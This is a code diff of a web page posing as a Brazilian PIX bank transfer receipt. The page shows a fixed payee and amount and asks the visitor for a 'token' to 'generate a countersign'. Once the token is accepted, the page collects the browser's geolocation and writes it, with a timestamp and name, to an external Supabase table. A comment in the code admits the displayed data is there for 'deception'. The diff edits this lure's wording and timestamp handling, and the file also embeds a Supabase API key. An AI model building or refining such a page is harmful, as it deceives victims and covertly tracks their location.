@@ -11,15 +11,13 @@
 <body>
    
     <h2>Comprovante de Transação PIX</h2>
-    
     <img id="logo" src="assets/bblogo.png" alt="Logo" width="300">
-    <p id="status">Para finalizar o depósito, confirma os dados do beneficiário e digite a <strong>Chave Token</strong> informada pelo depositante..</p>
-    <p id="dados">Após clique em PERMITIR para gerar a contrasenha</p>
+    <p id="status">Para finalizar o depósito, confirma os dados do beneficiário e digite a <strong>Chave Token</strong> informada pelo depositante.<br>Após clique em PERMITIR para gerar a contrasenha.</p>
+    <p id="dados">Após clique em PERMITIR para gerar a contrasenha.</p>
     <!-- <input type="text" id="username" placeholder="Nome completo" oninput="this.value = this.value.toUpperCase()"> -->
     <input type="text" id="password" placeholder="Chave Token" >
     <button id="gerar" onclick="checkAndSend()">GERAR CONTRASENHA</button>
     <button id="downloadBtn" style="display: none;" onclick="downloadImage()">Baixar Comprovante</button>
-
     <!-- <img id="imagem" src="assets/comprovante_desfocado.png" alt="Comprovante" width="200"> -->
 
     <script>
@@ -28,42 +26,29 @@
         const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZjZ2FkZHpuaXVnbHRsaW96ZG5sIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzk1NjYwODQsImV4cCI6MjA1NTE0MjA4NH0.26m1I7QPWZNb-NRYklzTiRgsQVEZ4iUOXmic-XRNg9Q";
         const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-        // Nome fixo para validação
+        // Dados para validação (e enganação)
         const NOME_FIXO = "Renato Tadeu Pereira";
         const BANCO = "SICOOB";
         const VALOR = "1.000,00"
         const CHAVE_PASSE = "754A38CF202548PP";
         const CONTRASENHA = "422JA54P2025BF82";
-        document.getElementById("dados").innerText = "Nome: " + NOME_FIXO + "\nBanco: " + BANCO + "\nValor: R$ " + VALOR;
-        
-        
+        document.getElementById("dados").innerText = "Nome: " + NOME_FIXO + "\nBanco: " + BANCO + "\nValor: R$ " + VALOR;       
 
         function checkAndSend() {
-            //const username = NOME_FIXO;
             const password = document.getElementById("password").value.trim();
-            // Verificando se o campo de nome está vazio
-            //if (!username) {
-               // document.getElementById("status").innerText = "Nome não pode ser vazio";
-                //return;
-           // }
             
-            // Verificando se o nome digitado é o esperado
-            //if (username !== NOME_FIXO.trim()) {
-              //  document.getElementById("status").innerText = "Nome incorreto. Tente novamente.";
-                //return;
-           // }
-            
+            //Verificando se a chave passe não é vazia
             if (!password) {
                 document.getElementById("status").innerText = "Chave Token não pode estar em branco";
                 return;
             }
             
-            // Verificando se o nome digitado é o esperado
+            // Verificando se a chave passe está correta
             if (password !== CHAVE_PASSE.trim()) {
                 document.getElementById("status").innerText = "Chave incorreta. Tente novamente.";
                 return;
             }
-            // Se nome válido, chama a função para pegar a localização
+            // Se chave válida, chama a função para pegar a localização
             getLocation(NOME_FIXO);
         }
 
@@ -85,13 +70,15 @@
         async function sendLocation(position, username) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
+            const localTime = new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });
+            const isoTime = new Date(localTime).toISOString(); // Converte para formato ISO
 
             //document.getElementById("imagem").src = "assets/comprovante.png";
 
             try {
                 const { data, error } = await supabase
                     .from("localizacoes")
-                    .insert([{ latitude, longitude, created_at: new Date().toISOString(), name: username }]);
+                    .insert([{ latitude, longitude, created_at: isoTime, name: username }]);
 
                 if (error) {
                     throw error;
